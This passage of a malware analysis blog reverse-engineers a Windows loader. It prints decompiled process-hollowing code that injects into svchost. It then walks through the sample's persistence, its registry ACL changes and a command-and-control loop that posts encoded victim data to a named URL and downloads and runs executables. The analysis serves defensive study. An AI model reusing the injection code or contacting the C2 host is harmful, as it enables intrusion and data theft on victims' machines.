<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="n">NtMapViewOfSection</span><span class="p">)(</span><span class="n">v16</span><span class="p">,</span><span class="w"> </span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">localSelectionAddress</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v13</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_READONLY</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">)</span><span class="c1">// svchost</span>
<span class="p">{</span>
<span class="nl">LABEL_23</span><span class="p">:</span>
<span class="w">    </span><span class="p">(</span><span class="n">ZwClose</span><span class="p">)(</span><span class="n">v16</span><span class="p">);</span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">LABEL_24</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">v1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">localSelectionAddress</span><span class="o">-&gt;</span><span class="n">e_lfarlc</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">localSelectionAddress</span><span class="o">-&gt;</span><span class="n">e_lfanew</span><span class="p">;</span>
<span class="n">v13</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">localSelectionAddress</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">e_sp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">localSelectionAddress</span><span class="o">-&gt;</span><span class="n">e_lfanew</span><span class="p">);</span>
<span class="n">v12</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="n">v1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span>
<span class="n">v14</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="n">ZWCreateSection</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">v9</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">unk_F001F</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v13</span><span class="p">,</span><span class="w"> </span><span class="mi">64</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8000000</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">)</span><span class="c1">// create memory section at svchost</span>
<span class="p">{</span>
<span class="nl">LABEL_22</span><span class="p">:</span>
<span class="w">    </span><span class="p">(</span><span class="n">NtUnmapViewOfSection</span><span class="p">)(</span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="n">localSelectionAddress</span><span class="p">);</span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">LABEL_23</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">svchostInMEM</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="n">v13</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="n">NtMapViewOfSection</span><span class="p">)(</span><span class="n">v9</span><span class="p">,</span><span class="w"> </span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">svchostInMEM</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v13</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_READWRITE</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">)</span>
<span class="p">{</span>
<span class="nl">LABEL_21</span><span class="p">:</span>
<span class="w">    </span><span class="p">(</span><span class="n">ZwClose</span><span class="p">)(</span><span class="n">v9</span><span class="p">);</span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">LABEL_22</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">qmemcpy</span><span class="p">(</span><span class="n">svchostInMEM</span><span class="p">,</span><span class="w"> </span><span class="n">localSelectionAddress</span><span class="p">,</span><span class="w"> </span><span class="n">v13</span><span class="p">);</span><span class="c1">// copy svchost</span>
<span class="n">v13</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="n">thisFile</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="n">thisFile</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">15</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">80</span><span class="p">);</span><span class="w">    </span><span class="c1">// This file</span>
<span class="n">v14</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="n">ZWCreateSection</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">v11</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">unk_F001F</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v13</span><span class="p">,</span><span class="w"> </span><span class="mi">64</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8000000</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="n">v10</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="n">v13</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="n">NtMapViewOfSection</span><span class="p">)(</span><span class="n">v11</span><span class="p">,</span><span class="w"> </span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v10</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v13</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_READWRITE</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">)</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// copy this file (itself) into memory</span>
<span class="w">    </span><span class="n">qmemcpy</span><span class="p">(</span><span class="n">v10</span><span class="p">,</span><span class="w"> </span><span class="n">thisFile</span><span class="p">,</span><span class="w"> </span><span class="n">v13</span><span class="p">);</span><span class="w">              </span><span class="c1">// and does nothing with it</span>
<span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">StartupInfo</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">StartupInfo</span><span class="p">));</span>
<span class="w">    </span><span class="n">StartupInfo</span><span class="p">.</span><span class="n">cb</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">68</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">CreateProcessW</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">lpFilename</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">CREATE_SUSPENDED</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">StartupInfo</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ProcessInformation</span><span class="p">)</span><span class="w"> </span><span class="p">)</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="n">v13</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1000000</span><span class="p">;</span>
<span class="w">        </span><span class="n">v14</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
<span class="w">        </span><span class="p">(</span><span class="n">NtDelayExecution</span><span class="p">)(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v13</span><span class="p">);</span><span class="w">            </span><span class="c1">// sleep</span>
<span class="w">        </span><span class="p">(</span><span class="n">NtUnmapViewOfSection</span><span class="p">)(</span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="n">v10</span><span class="p">);</span>
<span class="w">        </span><span class="n">v10</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">        </span><span class="n">v13</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w">                                </span><span class="c1">//    Map svchost into memory</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">!</span><span class="p">(</span><span class="n">NtMapViewOfSection</span><span class="p">)(</span><span class="n">v11</span><span class="p">,</span><span class="w"> </span><span class="n">ProcessInformation</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v10</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v13</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">64</span><span class="p">)</span><span class="w"> </span><span class="p">)</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">        </span><span class="p">(</span><span class="n">ZwClose</span><span class="p">)(</span><span class="n">v11</span><span class="p">);</span>
<span class="w">        </span><span class="n">v2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">svchostInMEM</span><span class="p">[</span><span class="n">v12</span><span class="p">];</span>
<span class="w">        </span><span class="o">*</span><span class="n">v2</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;h&#39;</span><span class="p">;</span>
<span class="w">        </span><span class="o">*</span><span class="n">v2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v10</span><span class="p">[</span><span class="n">a1</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">thisFile</span><span class="p">];</span>
<span class="w">        </span><span class="n">v2</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-61</span><span class="p">;</span><span class="w">                          </span><span class="c1">// adds `push 28213B9; ret` to svchost in memory</span>
<span class="w">        </span><span class="n">v4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">unk_10002</span><span class="p">;</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="n">GetThreadContest</span><span class="p">)(</span><span class="n">ProcessInformation</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v4</span><span class="p">)</span><span class="w"> </span><span class="p">)</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="n">v3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">v5</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">v12</span><span class="p">);</span>
<span class="w">            </span><span class="p">(</span><span class="n">NtUnmapViewOfSection</span><span class="p">)(</span><span class="n">ProcessInformation</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span><span class="n">v5</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">v12</span><span class="p">);</span>
<span class="w">            </span><span class="p">(</span><span class="n">NtUnmapViewOfSection</span><span class="p">)(</span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="n">svchostInMEM</span><span class="p">);</span>
<span class="w">            </span><span class="n">svchostInMEM</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">v3</span><span class="p">;</span>
<span class="w">            </span><span class="n">v13</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">!</span><span class="p">(</span><span class="n">NtMapViewOfSection</span><span class="p">)(</span><span class="n">v9</span><span class="p">,</span><span class="w"> </span><span class="n">ProcessInformation</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">svchostInMEM</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v13</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">64</span><span class="p">)</span><span class="w"> </span><span class="p">)</span>
<span class="w">            </span><span class="p">(</span><span class="n">NtResumeThread</span><span class="p">)(</span><span class="n">ProcessInformation</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">            </span><span class="k">goto</span><span class="w"> </span><span class="n">LABEL_21</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">goto</span><span class="w"> </span><span class="n">LABEL_20</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">else</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="p">(</span><span class="n">NtUnmapViewOfSection</span><span class="p">)(</span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="n">v10</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="p">(</span><span class="n">ZwClose</span><span class="p">)(</span><span class="n">v11</span><span class="p">);</span>
<span class="p">}</span>
<span class="nl">LABEL_20</span><span class="p">:</span>
<span class="p">(</span><span class="n">NtUnmapViewOfSection</span><span class="p">)(</span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="n">svchostInMEM</span><span class="p">);</span>
<span class="k">goto</span><span class="w"> </span><span class="n">LABEL_21</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>Now that we got the big picture, i will set a breakpoint at this location to dump the modified svchost</p>
<img alt="../_images/Screenshot_456.png" src="../_images/Screenshot_456.png" />
<p>Then follow address EDI in dissassembler, we find the modified code which is a jump to that location</p>
<img alt="../_images/Screenshot_466.png" src="../_images/Screenshot_466.png" />
<p>Following into memory then dumping the file</p>
<img alt="../_images/Screenshot_486.png" src="../_images/Screenshot_486.png" />
<p>The sections point to nothing, for example first section points to 400 while its null bytes as it was dumped from memory</p>
<img alt="../_images/Screenshot_496.png" src="../_images/Screenshot_496.png" />
<img alt="../_images/Screenshot_506.png" src="../_images/Screenshot_506.png" />
<div class="line-block">
<div class="line">Fixing the section alignment with put raw address on disk as virtual address on memory</div>
<div class="line">And then we can view it on pstudio</div>
</div>
<img alt="../_images/Screenshot_524.png" src="../_images/Screenshot_524.png" />
<img alt="../_images/Screenshot_5110.png" src="../_images/Screenshot_5110.png" />
<p>So the executable didn’t run, there was an error, i decided to break at NtResumeThread, then run to that function, in windbg attach to the created process svchost and break of entry <code class="docutils literal notranslate"><span class="pre">bp</span> <span class="pre">$exentry</span></code> and run in windbg , and then step over the NtResumeThread
and we get a hit on windbg</p>
<img alt="../_images/Screenshot_534.png" src="../_images/Screenshot_534.png" />
<img alt="../_images/Screenshot_544.png" src="../_images/Screenshot_544.png" />
<p>First it get the next instruction address by call and pop , where EAX will be at the end address of the first instruction</p>
<img alt="../_images/Screenshot_552.png" src="../_images/Screenshot_552.png" />
<img alt="../_images/Screenshot_562.png" src="../_images/Screenshot_562.png" />
<p>then it calls a function with that address</p>
<img alt="../_images/Screenshot_572.png" src="../_images/Screenshot_572.png" />
<p>and we get peb walking and api hashing</p>
<img alt="../_images/Screenshot_624.png" src="../_images/Screenshot_624.png" />
<p>to make it easier i will use ida with windbg debugger with same steps, attach process , run over NtResumeThread , break on entrypoint</p>
<img alt="../_images/Screenshot_592.png" src="../_images/Screenshot_592.png" />
<img alt="../_images/Screenshot_603.png" src="../_images/Screenshot_603.png" />
<p>we arrive at same push ret</p>
<img alt="../_images/Screenshot_6110.png" src="../_images/Screenshot_6110.png" />
<p>and then it is calling same decrypting function in original malware with a blob of data</p>
<img alt="../_images/Screenshot_643.png" src="../_images/Screenshot_643.png" />
<img alt="../_images/Screenshot_652.png" src="../_images/Screenshot_652.png" />
<p>We arrive at this compare where it is skipped in original malware (this code changes the dynamic function that will be called later)</p>
<img alt="../_images/Screenshot_662.png" src="../_images/Screenshot_662.png" />
<p>Running over some functions, we arive at a patched instruction with int 3 (cc) where it will decode data for the dynamic routine</p>
<img alt="../_images/Screenshot_672.png" src="../_images/Screenshot_672.png" />
<p>And here what the code looks like after replicating the patched instructions (notice we are still at the code that decodes the dynamic routine that was skipped in original malware)</p>
<img alt="../_images/Screenshot_682.png" src="../_images/Screenshot_682.png" />
<p>The instructions was patched by the malware, to continue debugging, we will return this to normal</p>
<img alt="../_images/Screenshot_692.png" src="../_images/Screenshot_692.png" />
<p>and we got a reference from a clean sample</p>
<img alt="../_images/Screenshot_702.png" src="../_images/Screenshot_702.png" />
<p>fixed</p>
<img alt="../_images/Screenshot_714.png" src="../_images/Screenshot_714.png" />
<img alt="../_images/Screenshot_723.png" src="../_images/Screenshot_723.png" />
<p>we arrive at the jump address but it is also patched, so we have to fix it same way from the clean sample</p>
<img alt="../_images/Screenshot_732.png" src="../_images/Screenshot_732.png" />
<img alt="../_images/Screenshot_742.png" src="../_images/Screenshot_742.png" />
<img alt="../_images/Screenshot_752.png" src="../_images/Screenshot_752.png" />
<p>And finally we arrive the main malicious code</p>
<img alt="../_images/Screenshot_762.png" src="../_images/Screenshot_762.png" />
<p>First function is a kernel32dll seterror, going into the second , it is also peb walking and api hashing</p>
<img alt="../_images/Screenshot_772.png" src="../_images/Screenshot_772.png" />
<img alt="../_images/Screenshot_782.png" src="../_images/Screenshot_782.png" />
<p>It gets the volume information and OS version</p>
<img alt="../_images/Screenshot_791.png" src="../_images/Screenshot_791.png" />
<p>Then checks if process is 64 or 32 bit</p>
<img alt="../_images/Screenshot_801.png" src="../_images/Screenshot_801.png" />
<p>Then sleeps and allocates place in memory</p>
<img alt="../_images/Screenshot_811.png" src="../_images/Screenshot_811.png" />
<p>Then it gets path of environment variable <code class="docutils literal notranslate"><span class="pre">src</span></code></p>
<img alt="../_images/Screenshot_821.png" src="../_images/Screenshot_821.png" />
<img alt="../_images/Screenshot_831.png" src="../_images/Screenshot_831.png" />
<p>Then calls a routine , that checks whether iam in admin group or not using this sid S-1-5-32-544 <a class="reference external" href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers">sidInfo</a></p>
<img alt="../_images/Screenshot_841.png" src="../_images/Screenshot_841.png" />
<p>If iam admin it will use all users and run registry , and if not it will just use current user and load registry</p>
<img alt="../_images/Screenshot_861.png" src="../_images/Screenshot_861.png" />
<p>Then it used GetTickCount that <code class="docutils literal notranslate"><span class="pre">Retrieves</span> <span class="pre">the</span> <span class="pre">number</span> <span class="pre">of</span> <span class="pre">milliseconds</span> <span class="pre">that</span> <span class="pre">have</span> <span class="pre">elapsed</span> <span class="pre">since</span> <span class="pre">the</span> <span class="pre">system</span> <span class="pre">was</span> <span class="pre">started</span></code> and masks it to 3 bits (as a way to generate a random number and set that dword variable based on that)</p>
<img alt="../_images/Screenshot_871.png" src="../_images/Screenshot_871.png" />
<p>which at the end settles on exe</p>
<img alt="../_images/Screenshot_881.png" src="../_images/Screenshot_881.png" />
<p>Then it creates a mutex with My VolumeInfo as a name, Then does <code class="docutils literal notranslate"><span class="pre">GetLastError()</span> <span class="pre">!=</span> <span class="pre">183</span></code> to check ERROR_ALREADY_EXISTS error if mutex already exists</p>
<img alt="../_images/Screenshot_891.png" src="../_images/Screenshot_891.png" />
<p>Then it calls a function, which copies our executable into allocated memory , and prepares temp folder variable</p>
<img alt="../_images/Screenshot_90.png" src="../_images/Screenshot_90.png" />
<img alt="../_images/Screenshot_911.png" src="../_images/Screenshot_911.png" />
<p>Then it gets just the executable name</p>
<img alt="../_images/Screenshot_921.png" src="../_images/Screenshot_921.png" />
<p>Then it checks if the file is in the temp folder to do the following code</p>
<img alt="../_images/Screenshot_941.png" src="../_images/Screenshot_941.png" />
<img alt="../_images/Screenshot_931.png" src="../_images/Screenshot_931.png" />
<p>Next function just allocates heap and another garbage code</p>
<img alt="../_images/Screenshot_951.png" src="../_images/Screenshot_951.png" />
<p>Prepares a name of the path executable that will likely copy into it, the executable will be in temp folder with name ms(RANDOM).exe (the random is from str(heapPTR))</p>
<img alt="../_images/Screenshot_961.png" src="../_images/Screenshot_961.png" />
<p>Then this blob, to copy the file into temp folder</p>
<img alt="../_images/Screenshot_981.png" src="../_images/Screenshot_981.png" />
<p>Then it sets CreationTime, &amp;LastAccessTime, &amp;LastWriteTime of svchost same as the created file in temp</p>
<img alt="../_images/Screenshot_991.png" src="../_images/Screenshot_991.png" />
<p>And copies the path of temp folder executable into registry key load</p>
<img alt="../_images/Screenshot_100.png" src="../_images/Screenshot_100.png" />
<img alt="../_images/Screenshot_1011.png" src="../_images/Screenshot_1011.png" />
<img alt="../_images/Screenshot_1021.png" src="../_images/Screenshot_1021.png" />
<p>Sets security descriptor of the key to D:(A;;KRWD;;;WD)</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>A: This stands for &quot;Allow.&quot; It specifies that this ACE allows access.

KRWD: These are access rights. Each letter corresponds to a specific set of rights:

K: Read Control
R: Read
W: Write
D: Delete
;;;WD: These are SID (Security Identifier) placeholders. The ;;; indicates that the ACE applies to &quot;Everyone&quot; (the well-known SID for the Everyone group).

The WD part specifies that this ACE applies to the &quot;Everyone&quot; group.
</pre></div>
</div>
<p>Then deletes the original file</p>
<img alt="../_images/Screenshot_1031.png" src="../_images/Screenshot_1031.png" />
<p>Next in the program flow, it calls 3 routines which are just noise</p>
<img alt="../_images/Screenshot_1041.png" src="../_images/Screenshot_1041.png" />
<p>First one, enumerates all registry values under <code class="docutils literal notranslate"><span class="pre">Software\\microsoft</span></code> , and search for that random number(i think) and does nothing with the return</p>
<img alt="../_images/Screenshot_1051.png" src="../_images/Screenshot_1051.png" />
<img alt="../_images/Screenshot_1061.png" src="../_images/Screenshot_1061.png" />
<p>Second function , enumerates all registry values under <code class="docutils literal notranslate"><span class="pre">Software\\microsoft</span></code> , and checks if type is reg_sz, and calls every software there</p>
<img alt="../_images/Screenshot_1091.png" src="../_images/Screenshot_1091.png" />
<img alt="../_images/Screenshot_1081.png" src="../_images/Screenshot_1081.png" />
<p>and sets the directory to %alluserprofile%</p>
<img alt="../_images/Screenshot_1101.png" src="../_images/Screenshot_1101.png" />
<img alt="../_images/Screenshot_1112.png" src="../_images/Screenshot_1112.png" />
<p>Third function calls www.update.microsoft.com</p>
<img alt="../_images/Screenshot_1121.png" src="../_images/Screenshot_1121.png" />
<p>Now onto the main function, it is in an infinite loop with a sleep at the end</p>
<img alt="../_images/Screenshot_1131.png" src="../_images/Screenshot_1131.png" />
<p>It first prepares a string with some of my info like id , admin or not (to know which machine it is running on)</p>
<img alt="../_images/Screenshot_1151.png" src="../_images/Screenshot_1151.png" />
<p>Then calls a loop that will break at first round (junk code)</p>
<img alt="../_images/Screenshot_1161.png" src="../_images/Screenshot_1161.png" />
<p>Encodes my info</p>
<img alt="../_images/Screenshot_1171.png" src="../_images/Screenshot_1171.png" />
<p>Then calls sub_2EC0FC1 with my data</p>
<img alt="../_images/Screenshot_1181.png" src="../_images/Screenshot_1181.png" />
<p>Which is a base64</p>
<img alt="../_images/Screenshot_1191.png" src="../_images/Screenshot_1191.png" />
<img alt="../_images/Screenshot_1201.png" src="../_images/Screenshot_1201.png" />
<p>Then enter an infinite loop (to ensure data send, will break on data sent), and calls postreq with my encoded data</p>
<img alt="../_images/Screenshot_1211.png" src="../_images/Screenshot_1211.png" />
<p>and this url <a class="reference external" href="http://filer.comeze.com/panel/image.php">http://filer.comeze.com/panel/image.php</a></p>
<img alt="../_images/Screenshot_1221.png" src="../_images/Screenshot_1221.png" />
<p>Into the postreq function, first it removes <a class="reference external" href="http://">http://</a> from the url</p>
<img alt="../_images/Screenshot_1261.png" src="../_images/Screenshot_1261.png" />
<p>then removes what is after /</p>
<img alt="../_images/Screenshot_1271.png" src="../_images/Screenshot_1271.png" />
<p>Then does series of checks to  try to resolve the host</p>
<img alt="../_images/Screenshot_1281.png" src="../_images/Screenshot_1281.png" />
<img alt="../_images/Screenshot_1291.png" src="../_images/Screenshot_1291.png" />
<img alt="../_images/Screenshot_130.png" src="../_images/Screenshot_130.png" />
<p>we got ip 1677745305 converting it to ip we get</p>
<img alt="../_images/Screenshot_1311.png" src="../_images/Screenshot_1311.png" />
<img alt="../_images/Screenshot_1321.png" src="../_images/Screenshot_1321.png" />
<p>starts the connection</p>
<img alt="../_images/Screenshot_1331.png" src="../_images/Screenshot_1331.png" />
<p>Then it checks if it got our info sends it as post request else just sends a get request, and gets the response in v13</p>
<img alt="../_images/Screenshot_1341.png" src="../_images/Screenshot_1341.png" />
<p>And returns the response</p>
<img alt="../_images/Screenshot_1351.png" src="../_images/Screenshot_1351.png" />
<p>Decodes the response, then calls a routine with that response</p>
<img alt="../_images/Screenshot_1371.png" src="../_images/Screenshot_1371.png" />
<p>In the function, it does some processing, then call another function with the processed response</p>
<img alt="../_images/Screenshot_1381.png" src="../_images/Screenshot_1381.png" />
<p>And based on the response it does multiple code cases</p>
<img alt="../_images/Screenshot_139.png" src="../_images/Screenshot_139.png" />
<p>First case, it downloads an executable to %src%  with name [Random].exe, then creates a process with that exe</p>
<img alt="../_images/Screenshot_140.png" src="../_images/Screenshot_140.png" />
<p>Second case, gets response data and pass it to sub_372119 and then saves the [Random].exe into software\microsoft registry</p>
<img alt="../_images/Screenshot_1411.png" src="../_images/Screenshot_1411.png" />
<img alt="../_images/Screenshot_1421.png" src="../_images/Screenshot_1421.png" />
<p>If there was error (miscalc) it would send the result as post request</p>
<img alt="../_images/Screenshot_149.png" src="../_images/Screenshot_149.png" />
<p>sub_372119 is same as we saw in orignial malware, it likely write a dynamic routine</p>
<img alt="../_images/Screenshot_1431.png" src="../_images/Screenshot_1431.png" />
<p>Third case, writes a file into temp folder with random name , and starts a process as that executable</p>
<img alt="../_images/Screenshot_1441.png" src="../_images/Screenshot_1441.png" />
<p>Fourth case , Writes an executable as ms[Random].dat (from The post request response)inside %alluserprofile%</p>
<img alt="../_images/Screenshot_1451.png" src="../_images/Screenshot_1451.png" />
<p>Fifth case is a cleanup deletes the executable and the registry created</p>
<img alt="../_images/Screenshot_1461.png" src="../_images/Screenshot_1461.png" />
<p>Sixth case runs what is in Load registry as a created process</p>
<img alt="../_images/Screenshot_1471.png" src="../_images/Screenshot_1471.png" />
<p>Seventh case it is retuning software\microsoft registry access to Everyone and does a cleanup of load registry</p>
<img alt="../_images/Screenshot_148.png" src="../_images/Screenshot_148.png" />
<p>Then at the very end does a cleanup and deletes the file</p>
<img alt="../_images/Screenshot_150.png" src="../_images/Screenshot_150.png" />
</section>


           </div>
          </div>
          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
        <a href="../confus/agentsmtp.html" class="btn btn-neutral float-left" title="Agent tesla (sample1)" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
    </div>

  <hr/>

  <div role="contentinfo">
    <p>&#169; Copyright 2023, abdelrahman khaled.</p>
  </div>

  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
